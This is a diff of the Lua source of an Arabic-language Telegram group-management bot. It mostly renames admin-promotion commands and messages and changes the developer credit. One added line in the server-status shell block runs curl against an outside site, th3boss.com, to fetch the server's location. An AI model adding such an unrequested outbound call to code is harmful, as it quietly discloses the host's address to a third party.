 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
-faederdx(msg.chat_id_, msg.id_, 1, '❀ *العضو* ( ['..faeder_res..'] )\n❀ *تم رفعه ( ادمن بالجروب ) *\n❀ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❀ *العضو* ( ['..faeder_res..'] )\n❀ *تم رفعه ( مشرف ) *\n❀ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
-if text:match("^تنزيل ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
+if text:match("^تنزيل مشرف$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
 function promote_by_reply(extra, result, success)
 local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
@@ -5460,7 +5479,7 @@ local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
-faederdx(msg.chat_id_, msg.id_, 1, '❀ *العضو* ( ['..faeder_res..'] )\n❀ *بواسطه ( '..renk_faeder(msg)..' )*\n❀ *تم رفعه ( ادمن بالجروب بكل الصلاحيات )\n❀ صلاحياته الان \n❀ تغيير اسم المجموعه \n❀ حذف الرسائل \n❀ الدعوه بالرابط \n❀ تثبيت الرسائل \n❀ اضافه مشرفين *', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❀ *العضو* ( ['..faeder_res..'] )\n❀ *بواسطه ( '..renk_faeder(msg)..' )*\n❀ *تم رفعه ( مشرف بكل الصلاحيات )\n❀ صلاحياته الان \n❀ تغيير اسم المجموعه \n❀ حذف الرسائل \n❀ الدعوه بالرابط \n❀ تثبيت الرسائل \n❀ اضافه مشرفين *', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
@@ -10190,7 +10209,7 @@ faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md")
 return false
 end end 
 --     By Developer Faeder     -- 
-if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) then
+if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "الردود العامه" and is_sudo(msg) then
 local redod = faederdx1:smembers(FAEDER.."rep_sudo")
 if #redod == 0 then
 faederdx(msg.chat_id_, msg.id_, 1, "❀ لا توجد ردود مضافه" ,  1, "md")
@@ -10652,7 +10671,7 @@ local text =  [[
 ❀ رفع « » تنزيل مدير
 ❀ رفع « » تنزيل ادمن 
 ❀ رفع « » تنزيل مميز 
-❀ رفع « » تنزيل ادمن بالجروب
+❀ رفع « » تنزيل مشرف
 ❀ رفع بكل الصلاحيات { بالجروب }
 ❀ الغاء خاصيه التثبيت { بالجروب }
 ❀ الغاء خاصيه تغيير الاسم { بالجروب } 
@@ -10935,6 +10954,7 @@ echo '❀ نظام التشغيل ، \n`'"$linux_version"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ الذاكره العشوائيه ،\n`'"$memUsedPrc"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ وحده التخزين ،\n`'"$HardDisk"'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ المعالج ،\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
+echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ موقـع الـسـيـرفـر \n* '`curl http://th3boss.com/ip/location`'*'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ الدخول ،\n`'`whoami`'`'
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❀ مده تشغيل السيرفر ،\n`'"$uptime"'`'
 ]]):read('*a'), 1, 'md')
@@ -11029,6 +11049,6 @@ addgroup(v)
 end end) end end end
 -------------------------******* The Best Source *******-------------------------
 -- END VERSION (24) FAEDER DX 
--- All The File By Developer Faeder : @DV_AD1
+-- All The File By Developer Faeder : @AY_AHD
 -- Join In Chennel Source : @SOPOWERB0T 
 -- Join In Explanation Channel : @SOPOWERB0T
